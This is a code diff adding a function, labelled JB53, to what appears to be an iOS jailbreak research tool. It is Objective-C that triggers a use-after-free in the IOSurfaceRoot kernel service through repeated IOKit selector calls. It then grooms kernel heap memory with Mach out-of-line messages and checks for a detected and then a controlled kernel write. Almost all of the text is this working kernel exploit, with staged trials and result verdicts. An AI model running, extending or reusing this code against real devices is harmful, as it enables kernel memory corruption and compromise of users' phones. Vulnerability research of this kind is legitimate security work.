@@ -40549,3 +40549,428 @@ void iosurface_fixed_shmem_oracle(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB53: Single-Conn UAF Exploit + Kernel Write Detection
+
+void iosurface_singleconn_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB53: === Single-Conn UAF Exploit + Kernel Write Detection ===");
+        log(@"JB53: JB41 single-conn pattern + field mapping + OOL reclaim");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB53";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB53: FAIL — dlsym missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        void *matchDict = sym_matching("IOSurfaceRoot");
+        unsigned int svc = matchDict ? sym_getmatch(0, matchDict) : 0;
+        if (!svc) {
+            log(@"JB53: FAIL — service not found");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+
+        unsigned int self_task = mach_task_self();
+        unsigned int oConn = 0, gConn = 0;
+        int oRc = sym_open(svc, self_task, 0, &oConn);
+        int gRc = sym_open(svc, self_task, 0, &gConn);
+        if (oRc != 0 || gRc != 0) {
+            log([NSString stringWithFormat:@"JB53: conn open FAIL o=0x%x g=0x%x", (uint32_t)oRc, (uint32_t)gRc]);
+            if (oRc == 0) sym_close(oConn);
+            if (gRc == 0) sym_close(gConn);
+            results[@"verdict"] = @"OPEN_FAIL";
+            if (sym_release) sym_release(svc);
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB53: oConn=0x%x gConn=0x%x", oConn, gConn]);
+
+        /* ===== Q1: Single-Connection UAF Confirmation (JB41 E2 exact) ===== */
+        log(@"JB53: ===== Q1: Single-Conn UAF Confirm (5 trials) =====");
+        int q1Hits = 0;
+
+        @try {
+        for (int t = 0; t < 5 && !isr_stopped(); t++) {
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int baseDup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gPorts[128];
+            int gCount = 0;
+            jb42_groomWithFields(gConn, 0x41, 0xDEAD005300000000ull, 0xCAFEBABE00000000ull, 0, 24, 128, gPorts, &gCount, sym_async);
+
+            int rdup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            int hit = ((uint32_t)baseDup == 0xE00002C9) && ((uint32_t)rdup != 0xE00002C9);
+            if (hit) q1Hits++;
+
+            log([NSString stringWithFormat:@"JB53: [Q1] t%d base=0x%x rdup=0x%x groom=%d %s",
+                 t, (uint32_t)baseDup, (uint32_t)rdup, gCount, hit ? "HIT" : "miss"]);
+
+            jb42_freeGroom(gPorts, gCount);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB53: [Q1] EXCEPTION: %@", e.reason]);
+        }
+
+        results[@"q1_hits"] = @(q1Hits);
+        log([NSString stringWithFormat:@"JB53: [Q1] hits=%d/5%s", q1Hits, q1Hits >= 3 ? " — UAF CONFIRMED" : ""]);
+
+        if (isr_stopped()) {
+            sym_close(oConn); sym_close(gConn);
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== Q2: Field Mapping — which groom fields affect the oracle ===== */
+        log(@"JB53: ===== Q2: Registry Entry Field Mapping =====");
+        int q2Results[4] = {0, 0, 0, 0};
+        const char *q2Labels[4] = {"regid_match", "regid_nomatch", "all_zero", "all_ff"};
+        uint64_t q2Patterns[4][3] = {
+            {1, 2, 3},
+            {0x9999, 0x8888, 0x7777},
+            {0, 0, 0},
+            {0xFFFFFFFFFFFFFFFFull, 0xFFFFFFFFFFFFFFFFull, 0xFFFFFFFFFFFFFFFFull}
+        };
+
+        @try {
+        for (int p = 0; p < 4 && !isr_stopped(); p++) {
+            int hits = 0;
+            for (int t = 0; t < 3 && !isr_stopped(); t++) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {1, 2, 3};
+
+                jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                int baseDup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int gPorts[128];
+                int gCount = 0;
+                jb42_groomWithFields(gConn, q2Patterns[p][0], q2Patterns[p][1], q2Patterns[p][2], 0, 24, 128, gPorts, &gCount, sym_async);
+
+                int rdup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                int dupIsC9 = ((uint32_t)rdup == 0xE00002C9);
+                jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                if ((uint32_t)baseDup == 0xE00002C9 && !dupIsC9) hits++;
+
+                log([NSString stringWithFormat:@"JB53: [Q2] pat=%s t%d base=0x%x rdup=0x%x %s",
+                     q2Labels[p], t, (uint32_t)baseDup, (uint32_t)rdup,
+                     ((uint32_t)baseDup == 0xE00002C9 && dupIsC9) ? "MATCH(0xC9)" : (((uint32_t)baseDup == 0xE00002C9 && !dupIsC9) ? "STALE" : "ctrl")]);
+
+                jb42_freeGroom(gPorts, gCount);
+                jb41_dropPort(wp);
+                usleep(2000);
+            }
+            q2Results[p] = hits;
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB53: [Q2] EXCEPTION: %@", e.reason]);
+        }
+
+        for (int p = 0; p < 4; p++) {
+            results[[NSString stringWithFormat:@"q2_%s", q2Labels[p]]] = @(q2Results[p]);
+        }
+        log([NSString stringWithFormat:@"JB53: [Q2] match=%d nomatch=%d zero=%d ff=%d",
+             q2Results[0], q2Results[1], q2Results[2], q2Results[3]]);
+
+        if (q2Results[0] == 0 && q2Results[1] > 0) {
+            log(@"JB53: [Q2] *** FIELD MAP: matching regId in groom → kernel sees as registered (0xC9)!");
+            log(@"JB53: [Q2] *** Non-matching regId → kernel re-registers (STALE). f[0] IS the regId field!");
+        }
+
+        if (isr_stopped()) {
+            sym_close(oConn); sym_close(gConn);
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== Q3: OOL Data Reclaim — Detect Kernel Write to Reclaimed Memory ===== */
+        log(@"JB53: ===== Q3: OOL Data Reclaim + Kernel Write Detection =====");
+        int q3Hits = 0;
+        int q3Modified = 0;
+
+        @try {
+        for (int t = 0; t < 5 && !isr_stopped(); t++) {
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int baseDup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            uint8_t oolPat[24];
+            memset(oolPat, 0xBB, 24);
+            oolPat[0] = 0xCC;
+            oolPat[23] = 0xDD;
+
+            unsigned int oolPorts[32];
+            int oolSent = 0;
+            for (int s = 0; s < 32; s++) {
+                unsigned int rPort = 0;
+                if (mach_port_allocate(self_task, MACH_PORT_RIGHT_RECEIVE, &rPort) != 0) continue;
+
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } sMsg;
+                memset(&sMsg, 0, sizeof(sMsg));
+                sMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                sMsg.hdr.msgh_size = (mach_msg_size_t)sizeof(sMsg);
+                sMsg.hdr.msgh_remote_port = rPort;
+                sMsg.hdr.msgh_local_port = 0;
+                sMsg.hdr.msgh_id = 0x53000 + s;
+                sMsg.body.msgh_descriptor_count = 1;
+                sMsg.ool.address = oolPat;
+                sMsg.ool.size = 24;
+                sMsg.ool.deallocate = 0;
+                sMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                sMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                int mr = mach_msg(&sMsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, (mach_msg_size_t)sizeof(sMsg), 0, 0, 100, 0);
+                if (mr == 0) {
+                    oolPorts[oolSent++] = rPort;
+                } else {
+                    mach_port_mod_refs(self_task, rPort, MACH_PORT_RIGHT_RECEIVE, -1);
+                }
+            }
+
+            int rdup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int uafHit = ((uint32_t)baseDup == 0xE00002C9) && ((uint32_t)rdup != 0xE00002C9);
+            if (uafHit) q3Hits++;
+
+            int modified = 0;
+            for (int r = 0; r < oolSent; r++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } rMsg;
+                memset(&rMsg, 0, sizeof(rMsg));
+                int mr = mach_msg(&rMsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rMsg), oolPorts[r], 100, 0);
+                if (mr == 0 && rMsg.ool.address && rMsg.ool.size == 24) {
+                    uint8_t *data = (uint8_t *)rMsg.ool.address;
+                    int diff = 0;
+                    for (int b = 0; b < 24; b++) {
+                        if (data[b] != oolPat[b]) diff++;
+                    }
+                    if (diff > 0) {
+                        modified++;
+                        if (modified <= 2) {
+                            uint64_t *dw = (uint64_t *)data;
+                            log([NSString stringWithFormat:@"JB53: [Q3] *** OOL MODIFIED msg[%d] diff=%d w0=0x%llx w1=0x%llx w2=0x%llx",
+                                 r, diff, dw[0], dw[1], dw[2]]);
+                        }
+                    }
+                    vm_deallocate(self_task, (vm_address_t)rMsg.ool.address, (vm_size_t)rMsg.ool.size);
+                }
+                mach_port_mod_refs(self_task, oolPorts[r], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+
+            if (modified > 0) q3Modified++;
+
+            log([NSString stringWithFormat:@"JB53: [Q3] t%d uaf=%s ool=%d modified=%d rdup=0x%x",
+                 t, uafHit ? "YES" : "no", oolSent, modified, (uint32_t)rdup]);
+
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_dropPort(wp);
+            usleep(5000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB53: [Q3] EXCEPTION: %@", e.reason]);
+        }
+
+        results[@"q3_uaf"] = @(q3Hits);
+        results[@"q3_modified"] = @(q3Modified);
+        log([NSString stringWithFormat:@"JB53: [Q3] uaf=%d/5 modified_trials=%d/5%s",
+             q3Hits, q3Modified, q3Modified > 0 ? " — *** KERNEL WRITE DETECTED ***" : ""]);
+
+        if (isr_stopped()) {
+            sym_close(oConn); sym_close(gConn);
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== Q4: Controlled Write — Use regId as Write Payload ===== */
+        log(@"JB53: ===== Q4: Controlled Kernel Write via RegId Payload =====");
+        int q4Hits = 0;
+        int q4Controlled = 0;
+
+        @try {
+        for (int t = 0; t < 5 && !isr_stopped(); t++) {
+            unsigned int wp = jb41_newWakePort();
+            uint64_t writeVal = 0xAAAA0053 + (uint64_t)t;
+            uint64_t in[3] = {writeVal, 0xBBBB0053, 0xCCCC0053};
+
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int baseDup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            uint8_t oolPat[24];
+            memset(oolPat, 0xEE, 24);
+
+            unsigned int oolPorts[64];
+            int oolSent = 0;
+            for (int s = 0; s < 64; s++) {
+                unsigned int rPort = 0;
+                if (mach_port_allocate(self_task, MACH_PORT_RIGHT_RECEIVE, &rPort) != 0) continue;
+
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } sMsg;
+                memset(&sMsg, 0, sizeof(sMsg));
+                sMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                sMsg.hdr.msgh_size = (mach_msg_size_t)sizeof(sMsg);
+                sMsg.hdr.msgh_remote_port = rPort;
+                sMsg.hdr.msgh_local_port = 0;
+                sMsg.hdr.msgh_id = 0x54000 + s;
+                sMsg.body.msgh_descriptor_count = 1;
+                sMsg.ool.address = oolPat;
+                sMsg.ool.size = 24;
+                sMsg.ool.deallocate = 0;
+                sMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                sMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                int mr = mach_msg(&sMsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, (mach_msg_size_t)sizeof(sMsg), 0, 0, 100, 0);
+                if (mr == 0) {
+                    oolPorts[oolSent++] = rPort;
+                } else {
+                    mach_port_mod_refs(self_task, rPort, MACH_PORT_RIGHT_RECEIVE, -1);
+                }
+            }
+
+            int rdup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int uafHit = ((uint32_t)baseDup == 0xE00002C9) && ((uint32_t)rdup != 0xE00002C9);
+            if (uafHit) q4Hits++;
+
+            int controlled = 0;
+            for (int r = 0; r < oolSent; r++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } rMsg;
+                memset(&rMsg, 0, sizeof(rMsg));
+                int mr = mach_msg(&rMsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rMsg), oolPorts[r], 100, 0);
+                if (mr == 0 && rMsg.ool.address && rMsg.ool.size == 24) {
+                    uint8_t *data = (uint8_t *)rMsg.ool.address;
+                    uint64_t *dw = (uint64_t *)data;
+                    int hasWriteVal = 0;
+                    for (int w = 0; w < 3; w++) {
+                        if (dw[w] == writeVal || dw[w] == 0xBBBB0053 || dw[w] == 0xCCCC0053) {
+                            hasWriteVal = 1;
+                        }
+                    }
+                    int diff = 0;
+                    for (int b = 0; b < 24; b++) {
+                        if (data[b] != 0xEE) diff++;
+                    }
+                    if (hasWriteVal) {
+                        controlled++;
+                        log([NSString stringWithFormat:@"JB53: [Q4] *** CONTROLLED WRITE msg[%d] w0=0x%llx w1=0x%llx w2=0x%llx",
+                             r, dw[0], dw[1], dw[2]]);
+                    } else if (diff > 0 && controlled == 0) {
+                        log([NSString stringWithFormat:@"JB53: [Q4] modified msg[%d] diff=%d w0=0x%llx w1=0x%llx w2=0x%llx",
+                             r, diff, dw[0], dw[1], dw[2]]);
+                    }
+                    vm_deallocate(self_task, (vm_address_t)rMsg.ool.address, (vm_size_t)rMsg.ool.size);
+                }
+                mach_port_mod_refs(self_task, oolPorts[r], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+
+            if (controlled > 0) q4Controlled++;
+
+            log([NSString stringWithFormat:@"JB53: [Q4] t%d uaf=%s ool=%d ctrl=%d regId=0x%llx rdup=0x%x",
+                 t, uafHit ? "YES" : "no", oolSent, controlled, writeVal, (uint32_t)rdup]);
+
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_dropPort(wp);
+            usleep(5000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB53: [Q4] EXCEPTION: %@", e.reason]);
+        }
+
+        results[@"q4_uaf"] = @(q4Hits);
+        results[@"q4_controlled"] = @(q4Controlled);
+        log([NSString stringWithFormat:@"JB53: [Q4] uaf=%d/5 controlled=%d/5%s",
+             q4Hits, q4Controlled, q4Controlled > 0 ? " — *** CONTROLLED KERNEL WRITE ***" : ""]);
+
+        sym_close(oConn);
+        sym_close(gConn);
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (q4Controlled > 0) {
+            verdict = @"CONTROLLED_KWRITE";
+            log(@"JB53: [!!!!!] CONTROLLED KERNEL WRITE — regId payload found in OOL data!");
+        } else if (q3Modified > 0) {
+            verdict = @"KERNEL_WRITE_DETECTED";
+            log(@"JB53: [!!!!] KERNEL WRITE to OOL data detected!");
+        } else if (q2Results[0] == 0 && q2Results[1] > 0) {
+            verdict = @"FIELD_MAPPED";
+            log(@"JB53: [!!!] Registry entry fields mapped — regId at f[0]");
+        } else if (q1Hits >= 3) {
+            verdict = @"UAF_CONFIRMED";
+            log(@"JB53: [!!] Single-conn UAF confirmed but no kernel write detected");
+        } else if (q1Hits > 0) {
+            verdict = @"UAF_PARTIAL";
+            log(@"JB53: [!] Partial UAF — inconsistent hits");
+        } else {
+            verdict = @"NO_UAF";
+            log(@"JB53: Single-conn UAF did not trigger");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB53: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB53-singleconn-exploit-checkpoint.json", results);
+        done(results);
+    });
+}
